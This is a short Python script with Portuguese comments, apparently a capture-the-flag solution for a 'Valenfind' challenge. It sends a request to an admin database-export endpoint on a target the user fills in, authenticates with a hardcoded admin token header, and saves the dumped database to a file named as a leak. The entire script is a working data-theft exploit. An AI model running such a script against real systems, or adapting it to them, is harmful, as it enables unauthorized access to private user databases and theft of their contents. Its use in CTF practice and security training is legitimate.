import requests                                                                                                                                  
                                                                                                                                                 
# Endereço do host controlado
url = "http://xx.xx.xx.xx:5000/api/admin/export_db" # altere a url para o seu alvo

# Header com o token administrativo
headers = {
    "X-Valentine-Token": "CUPID_MASTER_KEY_2024_XOXO"
}

try:
    # Fazendo a requisição GET
    response = requests.get(url, headers=headers)

    # Exibindo status da resposta
    print("Status Code:", response.status_code)

    # Se a resposta for OK, salvar o conteúdo em arquivo
    if response.status_code == 200:
        with open("valenfind_leak.db", "wb") as f:
            f.write(response.content)
        print("Banco de dados salvo como valenfind_leak.db")
    else:
        print("Resposta do servidor:", response.text)

except Exception as e:
    print("Erro na requisição:", e)
